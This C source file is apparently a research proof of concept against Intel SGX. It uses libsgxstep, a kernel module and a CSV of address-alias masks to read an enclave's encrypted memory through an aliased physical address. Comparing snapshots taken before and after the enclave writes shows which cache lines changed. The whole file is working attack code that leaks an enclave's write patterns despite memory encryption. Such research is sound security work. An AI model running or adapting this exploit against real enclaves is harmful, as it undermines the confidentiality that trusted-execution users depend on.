#include <sgx_urts.h>
#include "Enclave/encl_u.h"
#include <unistd.h>
#include "libsgxstep/pt.h"
#include "libsgxstep/debug.h"

#include "readalias.h"
#include "mem_range_repo.h"
#include "helpers.h"

#define DBG_ENCL           1
#define ALIAS_BIT          34
#define ALLOC_SIZE         1*PAGE_SIZE


sgx_enclave_id_t eid = 0;
unsigned char epc_buf1[ALLOC_SIZE], epc_buf2[ALLOC_SIZE];

// Hacky method to avoid linking problems :)
void* sgx_get_aep(void)
{
    return NULL;
}
void sgx_set_aep(void* aep)
{
}
void* sgx_get_tcs(void)
{
    return NULL;
}

page_stats_t stats;

int main( int argc, char **argv )
{
    if(argc != 2 ) {
        printf("Usage: ./app <path to alias definition csv>\n");
        return -1;
    }

    char* path_alias_csv = argv[1];
    mem_range_t* mrs = NULL;
    uint64_t* alias_masks = NULL;
    size_t mrs_len;
    if( parse_csv(path_alias_csv, &mrs, &alias_masks, &mrs_len) ) {
        err_log("failed to parse memory range and aliases from %s\n", path_alias_csv);
        return -1;
    }

    info_event("Opening driver...");
    if (open_kmod()) {
        err_log("Error: Unable to open drive.\n");
        return -1;
    }

    info_event("Creating enclave...");
    SGX_ASSERT( sgx_create_enclave( "./Enclave/encl.so", /*debug=*/DBG_ENCL,
                                    NULL, NULL, &eid, NULL ) );

    // Get the va of the buffer and translate it to its pa
    unsigned char *buffer;
    SGX_ASSERT( initialize_buffer(eid) );
    SGX_ASSERT( get_buffer_addr(eid, (void*)&buffer) );

    address_mapping_t *map = get_mappings(buffer);
    uint64_t pa = phys_address(map, PAGE);

    // Get the alias for the pa of the buffer
    uint64_t alias;
    if (get_alias(pa, mrs, alias_masks, 1, &alias)) {
        err_log("Error: Unable to compute alias address.\n");
        return -1;
    }
   
    printf("\nBuffer allocated at va=0x%lx -- pa=0x%lx -- alias=%lx\n", buffer, pa, alias);

    printf("\nTaking initial snapshot of buffer from alias=%lx\n", alias);
    if (memcpy_frompa(epc_buf1, alias, ALLOC_SIZE, &stats, true)) {
        err_log("Error: Unable to read from alias.\n");
        return -1;
    }

    // `write_to_buffer` will increment the value at the given offset
    int offset = rand() % 4096;  // Generate random offset
    printf("Modifying enclave buffer at offset %#05x\n", offset);
    SGX_ASSERT( write_to_buffer(eid, offset) );

    printf("Comparing EPC contents for changes\n");
    if (memcpy_frompa(epc_buf2, alias, ALLOC_SIZE, &stats, true)) {
        err_log("Error: Unable to read from alias.\n");
        return -1;
    }

    // Compare each cache line belonging to the buffer to its content before the
    // modification. While we cannot read the contents directly due to the
    // memory encryption, the changes in the ciphertext will reveal which cache
    // lines were written to.
    for (int i = 0; i < ALLOC_SIZE; i += 64) {
        if (memcmp(&epc_buf1[i], &epc_buf2[i], 64) != 0) {
            printf(" --> Cacheline changed at pa=0x%lx (offset %#05x)\n", pa + i, i);
        }
    }

    SGX_ASSERT( sgx_destroy_enclave( eid ) );

    info_event("Done.");

    return 0;
}
